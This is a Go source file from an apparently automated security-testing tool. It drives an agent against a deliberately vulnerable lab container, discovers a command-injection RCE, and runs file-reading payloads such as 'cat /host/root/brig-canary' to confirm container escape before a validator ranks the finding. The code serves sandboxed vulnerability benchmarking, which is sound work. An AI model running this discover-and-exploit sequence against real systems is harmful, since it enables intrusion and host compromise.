// Command gored-brigagent is the first AGENT step wired into the Validator: against a
// running Brig it DISCOVERS the container app's RCE (unguided), exploits it to read the
// in-container and host canaries (RCE and escape, by oracle), turns the confirmed steps
// into GORED proofs, and runs the Validator to produce a ranked verdict — an exploitable
// CWE-78 finding carrying the host-compromise chain, with the executed exploit as its repro.
//
// It drives the Brig over the vsock bridge; the vulnapp container must be running (see
// gobrig/scripts/bench.sh or docs/BENCH.md for the setup). Discovery is still deterministic
// (the doer's tool); a later step drives it with the local-model swarm.
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"strings"

	validate "github.com/t0ul/GORED/internal/validate"
	"github.com/t0ul/gobrig"
)

func main() {
	bridge := flag.String("bridge", "127.0.0.1:5050", "the Brig's vsock command bridge")
	base := flag.String("base", "http://127.0.0.1:8088", "the target app's base URL on the guest loopback")
	app := flag.String("app", "brig-target", "app name for the verdict")
	flag.Parse()

	ctx := context.Background()
	c := gobrig.Client{Bridge: *bridge}
	fetch := func(ctx context.Context, u string) (string, error) { return gobrig.HTTPGet(ctx, c, u) }

	fmt.Println("==> discovering an RCE (unguided: sweeping candidate endpoints and params)")
	f, ok := gobrig.DiscoverRCE(ctx, fetch, *base, nil, nil)
	if !ok {
		fmt.Println("no RCE discovered (is the vulnapp container running?)")
		os.Exit(1)
	}
	fmt.Println("    " + f.Evidence)

	// Confirm RCE (in-container canary) and escape (host canary) through the discovered point.
	inCanary := "BRIG-RCE-INCONTAINER-7c21"
	rceOut, _ := gobrig.HTTPGet(ctx, c, f.Exploit(*base, "cat /flag-in-container"))
	rceConfirmed := strings.Contains(rceOut, inCanary)
	hostOut, _ := gobrig.HTTPGet(ctx, c, f.Exploit(*base, "cat /host/root/brig-canary"))
	escapeConfirmed := strings.Contains(hostOut, "BRIG-HOST-SECRET")

	fmt.Printf("==> RCE confirmed=%v  escape confirmed=%v\n", rceConfirmed, escapeConfirmed)

	proofs := buildProofs(*app, *base, f, rceConfirmed, escapeConfirmed)
	verdicts := (&validate.Validator{}).Validate(nil, proofs)

	fmt.Printf("\n==== verdicts ====\n%s", summarize(verdicts))
}
